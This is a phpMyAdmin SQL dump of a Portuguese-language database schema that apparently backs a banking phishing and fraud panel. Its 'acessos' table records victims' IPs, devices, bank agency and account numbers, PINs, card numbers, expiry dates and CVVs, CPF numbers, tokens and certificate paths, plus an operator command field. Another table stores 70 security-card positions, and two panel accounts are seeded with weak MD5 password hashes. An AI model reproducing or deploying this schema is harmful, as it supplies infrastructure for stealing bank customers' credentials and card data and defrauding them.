-- phpMyAdmin SQL Dump
-- version 4.8.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: 01-Set-2018 às 23:41
-- Versão do servidor: 10.1.33-MariaDB
-- PHP Version: 7.2.6

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `op_brada_kevin`
--

-- --------------------------------------------------------

--
-- Estrutura da tabela `acessos`
--

CREATE TABLE `acessos` (
  `id` varchar(256) NOT NULL,
  `ip` varchar(256) NOT NULL,
  `pc_name` varchar(256) NOT NULL,
  `data_acesso` datetime NOT NULL,
  `browser_name` varchar(256) NOT NULL,
  `browser_version` varchar(256) NOT NULL,
  `sistema_operacional` varchar(256) NOT NULL,
  `cidade` varchar(256) NOT NULL,
  `estado` varchar(256) NOT NULL,
  `pais` varchar(256) NOT NULL,
  `tipo_acesso` varchar(256) NOT NULL,
  `comando` varchar(256) NOT NULL,
  `status` varchar(256) DEFAULT NULL,
  `agencia` varchar(256) NOT NULL,
  `conta` varchar(256) NOT NULL,
  `digito` varchar(256) NOT NULL,
  `nome` varchar(256) DEFAULT NULL,
  `senha_4` varchar(256) DEFAULT NULL,
  `pass_6` varchar(256) DEFAULT NULL,
  `enviou_tabela` varchar(256) NOT NULL,
  `cc_nome` varchar(256) DEFAULT NULL,
  `cc_numero` varchar(256) DEFAULT NULL,
  `cc_val` varchar(256) DEFAULT NULL,
  `cc_cvv` varchar(256) DEFAULT NULL,
  `tipo_dispositivo` varchar(256) DEFAULT NULL,
  `token` varchar(256) DEFAULT NULL,
  `ddd` varchar(256) DEFAULT NULL,
  `fone` varchar(256) DEFAULT NULL,
  `token_ref` varchar(256) DEFAULT NULL,
  `tabela_pos` varchar(256) DEFAULT NULL,
  `tabela_valor` varchar(256) DEFAULT NULL,
  `qr_link` varchar(455) DEFAULT NULL,
  `qr_value` varchar(256) DEFAULT NULL,
  `anotacao` varchar(256) DEFAULT NULL,
  `user_message` varchar(256) DEFAULT NULL,
  `time_acesso` varchar(256) NOT NULL,
  `cpf` varchar(256) DEFAULT NULL,
  `comprovante_patch` varchar(256) DEFAULT NULL,
  `cert_path` varchar(256) DEFAULT NULL,
  `key_path` varchar(256) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estrutura da tabela `tabela_usuarios`
--

CREATE TABLE `tabela_usuarios` (
  `id_table` int(11) NOT NULL,
  `id_user` varchar(256) NOT NULL,
  `tabela_referencia` varchar(256) NOT NULL,
  `pos01` varchar(256) NOT NULL,
  `pos02` varchar(256) NOT NULL,
  `pos03` varchar(256) NOT NULL,
  `pos04` varchar(256) NOT NULL,
  `pos05` varchar(256) NOT NULL,
  `pos06` varchar(256) NOT NULL,
  `pos07` varchar(256) NOT NULL,
  `pos08` varchar(256) NOT NULL,
  `pos09` varchar(256) NOT NULL,
  `pos10` varchar(256) NOT NULL,
  `pos11` varchar(256) NOT NULL,
  `pos12` varchar(256) NOT NULL,
  `pos13` varchar(256) NOT NULL,
  `pos14` varchar(256) NOT NULL,
  `pos15` varchar(256) NOT NULL,
  `pos16` varchar(256) NOT NULL,
  `pos17` varchar(256) NOT NULL,
  `pos18` varchar(256) NOT NULL,
  `pos19` varchar(256) NOT NULL,
  `pos20` varchar(256) NOT NULL,
  `pos21` varchar(256) NOT NULL,
  `pos22` varchar(256) NOT NULL,
  `pos23` varchar(256) NOT NULL,
  `pos24` varchar(256) NOT NULL,
  `pos25` varchar(256) NOT NULL,
  `pos26` varchar(256) NOT NULL,
  `pos27` varchar(256) NOT NULL,
  `pos28` varchar(256) NOT NULL,
  `pos29` varchar(256) NOT NULL,
  `pos30` varchar(256) NOT NULL,
  `pos31` varchar(256) NOT NULL,
  `pos32` varchar(256) NOT NULL,
  `pos33` varchar(256) NOT NULL,
  `pos34` varchar(256) NOT NULL,
  `pos35` varchar(256) NOT NULL,
  `pos36` varchar(256) NOT NULL,
  `pos37` varchar(256) NOT NULL,
  `pos38` varchar(256) NOT NULL,
  `pos39` varchar(256) NOT NULL,
  `pos40` varchar(256) NOT NULL,
  `pos41` varchar(256) NOT NULL,
  `pos42` varchar(256) NOT NULL,
  `pos43` varchar(256) NOT NULL,
  `pos44` varchar(256) NOT NULL,
  `pos45` varchar(256) NOT NULL,
  `pos46` varchar(256) NOT NULL,
  `pos47` varchar(256) NOT NULL,
  `pos48` varchar(256) NOT NULL,
  `pos49` varchar(256) NOT NULL,
  `pos50` varchar(256) NOT NULL,
  `pos51` varchar(256) NOT NULL,
  `pos52` varchar(256) NOT NULL,
  `pos53` varchar(256) NOT NULL,
  `pos54` varchar(256) NOT NULL,
  `pos55` varchar(256) NOT NULL,
  `pos56` varchar(256) NOT NULL,
  `pos57` varchar(256) NOT NULL,
  `pos58` varchar(256) NOT NULL,
  `pos59` varchar(256) NOT NULL,
  `pos60` varchar(256) NOT NULL,
  `pos61` varchar(256) NOT NULL,
  `pos62` varchar(256) NOT NULL,
  `pos63` varchar(256) NOT NULL,
  `pos64` varchar(256) NOT NULL,
  `pos65` varchar(256) NOT NULL,
  `pos66` varchar(256) NOT NULL,
  `pos67` varchar(256) NOT NULL,
  `pos68` varchar(256) NOT NULL,
  `pos69` varchar(256) NOT NULL,
  `pos70` varchar(256) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estrutura da tabela `usuarios`
--

CREATE TABLE `usuarios` (
  `id` int(11) NOT NULL,
  `login` varchar(256) NOT NULL,
  `senha` varchar(256) NOT NULL,
  `nivel` int(11) NOT NULL,
  `status` varchar(256) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Extraindo dados da tabela `usuarios`
--

INSERT INTO `usuarios` (`id`, `login`, `senha`, `nivel`, `status`) VALUES
(1, 'admin', '21232f297a57a5a743894a0e4a801fc3', 2, '1'),
(2, 'operador', '06d4f07c943a4da1c8bfe591abbc3579', 1, '0');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `acessos`
--
ALTER TABLE `acessos`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tabela_usuarios`
--
ALTER TABLE `tabela_usuarios`
  ADD PRIMARY KEY (`id_table`);

--
-- Indexes for table `usuarios`
--
ALTER TABLE `usuarios`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `tabela_usuarios`
--
ALTER TABLE `tabela_usuarios`
  MODIFY `id_table` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `usuarios`
--
ALTER TABLE `usuarios`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
